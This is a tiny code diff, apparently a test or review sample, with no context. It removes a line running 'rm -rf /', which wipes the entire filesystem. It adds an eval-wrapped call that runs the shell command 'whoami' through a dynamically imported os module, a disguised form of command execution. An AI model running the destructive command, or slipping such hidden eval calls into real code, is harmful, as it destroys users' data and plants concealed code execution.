@@ -1,2 +1,2 @@
-import os
-os.system('rm -rf /')
+    pass  # no-op
+eval('__import__(\"os\").system(\"whoami\")')
